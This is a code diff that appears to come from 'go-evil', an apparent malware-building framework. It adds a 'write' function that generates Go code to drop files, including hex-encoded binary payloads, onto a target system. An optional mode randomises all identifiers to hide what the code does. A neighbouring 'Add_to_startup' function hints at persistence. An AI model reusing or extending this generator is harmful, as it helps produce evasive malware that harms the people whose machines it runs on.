@@ -286,3 +286,62 @@ func Add_to_startup(s_json string) (string, string) {
 
 	return fmt.Sprintf("%s()", function_call), structure.Send(data_object)
 }
+
+//
+//
+// Writes a provided content to a provided file
+//
+//
+func write(s_json string, value string) (string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Write"
+	param1 := "path"
+	param2 := "content"
+	var1 := "file"
+	var2 := "result"
+	var3 := "ok"
+	var4 := "split"
+	var5 := "data"
+
+	if data_object.Obfuscate {
+		function_call = tools.Generate_random_string()
+		param1 = tools.Generate_random_string()
+		param2 = tools.Generate_random_string()
+		var1 = tools.Generate_random_string()
+		var2 = tools.Generate_random_string()
+		var3 = tools.Generate_random_string()
+		var4 = tools.Generate_random_string()
+		var5 = tools.Generate_random_string()
+	}
+
+	arr := tools.Extract_values_array(value)
+	path := arr[0]
+	data := strings.Join(arr[1:], " ")
+
+	if data_object.Check_global_name(data) {
+		data = tools.Erase_delimiter(data, "\"")
+	}
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(%s string, %s string){", function_call, param1, param2),
+		fmt.Sprintf("%s, %s := os.Create(%s)", var1, var2, param1),
+		fmt.Sprintf("if %s == nil{", var2),
+		fmt.Sprintf("defer %s.Close()", var1),
+		fmt.Sprintf("%s := tools.Starts_with(%s, []string{\"[HEX];\"})", var2, param2),
+		fmt.Sprintf("if %s := %s[\"[HEX];\"]; !%s{", var3, var2, var3),
+		fmt.Sprintf("%s.WriteString(%s)", var1, param2),
+		"}else{",
+		fmt.Sprintf("%s := strings.Split(%s, \",\")", var4, param2),
+		fmt.Sprintf("for _, %s := range %s {", var5, var4),
+		fmt.Sprintf("%s, _ := hex.DecodeString(%s)", var5, var5),
+		fmt.Sprintf("%s.Write(%s)", var1, var5),
+		"}}}}",
+	})
+
+	data_object.Add_go_import("encoding/hex")
+	data_object.Add_go_import("os")
+	data_object.Add_go_import("strings")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+
+	return fmt.Sprintf("%s(%s, %s)", function_call, path, data), structure.Send(data_object)
+}
